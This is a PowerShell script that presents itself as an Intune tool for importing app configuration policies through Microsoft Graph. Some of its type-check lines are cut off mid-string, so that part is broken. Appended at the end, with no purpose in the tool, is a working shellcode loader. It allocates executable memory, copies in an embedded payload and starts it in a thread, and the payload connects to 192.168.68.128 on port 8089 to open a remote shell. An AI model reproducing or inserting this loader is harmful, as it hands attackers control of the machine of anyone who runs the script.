




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        Write-Host
        Write-Host "AzureAD Powershell module not installed..." -f Red
        Write-Host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        Write-Host "Script can't continue..." -f Red
        Write-Host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    Write-Host $_.Exception.Message -f Red
    Write-Host $_.Exception.ItemName -f Red
    Write-Host
    break

    }

}



Function Test-JSON(){



param (

$JSON

)

    try {

    $TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop
    $validJson = $true

    }

    catch {

    $validJson = $false
    $_.Exception

    }

    if (!$validJson){
    
    Write-Host "Provided JSON isn't in valid JSON format" -f Red
    break

    }

}



Function Test-AppBundleId(){



param (

$bundleId

)

$graphApiVersion = "Beta"
$Resource = "deviceAppManagement/mobileApps?`$filter=(microsoft.graph.managedApp/appAvailability eq null or microsoft.graph.managedApp/appAvailability eq 'lineOfBusiness' or isAssigned eq true) and (isof('microsoft.graph.iosLobApp') or isof('microsoft.graph.iosStoreApp') or isof('microsoft.graph.iosVppApp') or isof('microsoft.graph.managedIOSStoreApp') or isof('microsoft.graph.managedIOSLobApp'))"

   try {
        
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        $mobileApps = Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get
             
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    Write-Host
    break

    }

    $app = $mobileApps.value | where {$_.bundleId -eq $bundleId}
    
    If($app){
    
        return $app.id

    }
    
    Else{

        return $false

    }
       
}



Function Test-AppPackageId(){



param (

$packageId

)

$graphApiVersion = "Beta"
$Resource = "deviceAppManagement/mobileApps?`$filter=(isof('microsoft.graph.androidForWorkApp') or microsoft.graph.androidManagedStoreApp/supportsOemConfig eq false)"

   try {
        
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        $mobileApps = Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get
        
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    Write-Host
    break

    }

    $app = $mobileApps.value | where {$_.packageId -eq $packageId}
    
    If($app){
    
        return $app.id

    }
    
    Else{

        return $false

    }

}



Function Add-ManagedAppAppConfigPolicy(){



[cmdletbinding()]

param
(
    $JSON
)

$graphApiVersion = "Beta"
$Resource = "deviceAppManagement/targetedManagedAppConfigurations"
    
    try {

        if($JSON -eq "" -or $JSON -eq $null){

        Write-Host "No JSON specified, please specify valid JSON for the App Configuration Policy..." -f Red

        }

        else {

        Test-JSON -JSON $JSON

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"

        }

    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    Write-Host
    break

    }

}



Function Add-ManagedDeviceAppConfigPolicy(){



[cmdletbinding()]

param
(
    $JSON
)

$graphApiVersion = "Beta"
$Resource = "deviceAppManagement/mobileAppConfigurations"
    
    try {

        if($JSON -eq "" -or $JSON -eq $null){

        Write-Host "No JSON specified, please specify valid JSON for the App Configuration Policy..." -f Red

        }

        else {

        Test-JSON -JSON $JSON

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"

        }

    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    Write-Host
    break

    }

}





Write-Host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        Write-Host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        Write-Host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$ImportPath = Read-Host -Prompt "Please specify a path to a JSON file to import data from e.g. C:\IntuneOutput\Policies\policy.json"


$ImportPath = $ImportPath.replace('"','')

if(!(Test-Path "$ImportPath")){

Write-Host "Import Path for JSON file doesn't exist..." -ForegroundColor Red
Write-Host "Script can't continue..." -ForegroundColor Red
Write-Host
break

}

$JSON_Data = gc "$ImportPath"


$JSON_Convert = $JSON_Data | ConvertFrom-Json | Select-Object -Property * -ExcludeProperty id,createdDateTime,lastModifiedDateTime,version,isAssigned,roleScopeTagIds

$DisplayName = $JSON_Convert.displayName

Write-Host
Write-Host "App Configuration Policy '$DisplayName' Found..." -ForegroundColor Yellow



If(($JSON_Convert.'@odata.type' -eq "

    Write-Host "App Configuration JSON is for Managed Devices" -ForegroundColor Yellow

    If($JSON_Convert.'@odata.type' -eq "

        
        $targetedMobileApp = Test-AppBundleId -bundleId $JSON_Convert.bundleId
           
        If($targetedMobileApp){

            Write-Host
            Write-Host "Targeted app $($JSON_Convert.bundleId) has already been added from the App Store" -ForegroundColor Yellow
            Write-Host "The App Configuration Policy will be created" -ForegroundColor Yellow
            Write-Host

            
            If(!($targetedMobileApp -eq $JSON_Convert.targetedMobileApps)){

                $JSON_Convert.targetedMobileApps.SetValue($targetedMobileApp,0)

            }

            $JSON_Output = $JSON_Convert | ConvertTo-Json -Depth 5
            $JSON_Output
            Write-Host
            Write-Host "Adding App Configuration Policy '$DisplayName'" -ForegroundColor Yellow
            Add-ManagedDeviceAppConfigPolicy -JSON $JSON_Output

        }

        Else
        {

            Write-Host
            Write-Host "Targeted app bundle id '$($JSON_Convert.bundleId)' has not been added from the App Store" -ForegroundColor Red
            Write-Host "The App Configuration Policy can't be created" -ForegroundColor Red

        }


    }

    ElseIf($JSON_Convert.'@odata.type' -eq "

        
        $targetedMobileApp = Test-AppPackageId -packageId $JSON_Convert.packageId
        
        If($targetedMobileApp){

            Write-Host
            Write-Host "Targeted app $($JSON_Convert.packageId) has already been added from Managed Google Play" -ForegroundColor Yellow
            Write-Host "The App Configuration Policy will be created" -ForegroundColor Yellow
            Write-Host
            
            
            If(!($targetedMobileApp -eq $JSON_Convert.targetedMobileApps)){
               
                $JSON_Convert.targetedMobileApps.SetValue($targetedMobileApp,0)

            }

            $JSON_Output = $JSON_Convert | ConvertTo-Json -Depth 5
            $JSON_Output
            Write-Host   
            Write-Host "Adding App Configuration Policy '$DisplayName'" -ForegroundColor Yellow                                                      
            Add-ManagedDeviceAppConfigPolicy -JSON $JSON_Output

        }

        Else
        {

            Write-Host
            Write-Host "Targeted app package id '$($JSON_Convert.packageId)' has not been added from Managed Google Play" -ForegroundColor Red
            Write-Host "The App Configuration Policy can't be created" -ForegroundColor Red

        }
    
    }

}

Else
{

    Write-Host "App Configuration JSON is for Managed Apps" -ForegroundColor Yellow
    $JSON_Output = $JSON_Convert | ConvertTo-Json -Depth 5
    $JSON_Output
    Write-Host
    Write-Host "Adding App Configuration Policy '$DisplayName'" -ForegroundColor Yellow
    Add-ManagedAppAppConfigPolicy -JSON $JSON_Output   

}
 





$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x44,0x80,0x68,0x02,0x00,0x1f,0x99,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

